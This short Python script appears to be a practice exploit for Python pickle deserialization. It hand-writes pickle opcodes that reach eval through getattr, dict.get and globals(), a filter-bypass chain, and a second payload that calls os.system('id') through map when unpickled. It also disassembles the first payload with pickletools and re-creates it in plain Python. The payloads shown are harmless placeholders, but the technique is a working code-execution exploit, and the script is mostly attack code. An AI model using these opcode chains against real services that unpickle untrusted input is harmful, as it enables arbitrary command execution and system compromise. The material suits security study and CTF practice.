import builtins
import pickle
import pickletools
import sys

opcode = b'cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0g0\n(g1\nS\'get\'\ntRp2\n0cbuiltins\nglobals\n(tRp3\n0g2\n(g3\nS\'builtins\'\ntRp4\n0g0\n(g4\nS\'eval\'\ntRp5\n0g5\n(S\'print("123")\'\ntR.'

pickle.loads(opcode)
pickletools.dis(opcode)
print("=======================")
getattr = builtins.getattr
dict = builtins.dict
dict_get = dict.get
glo_dic = builtins.globals()
builtins = dict_get(glo_dic,'builtins')
eval = getattr(builtins,'eval')
eval('print("123")')
print("=======================")
opcode=b'''c__builtin__
map
p0
0(S'id'
tp1
0(cos
system
g1
tp2
0g0
g2
\x81p3
0c__builtin__
bytes
p4
(g3
t\x81.'''
pickle.loads(opcode)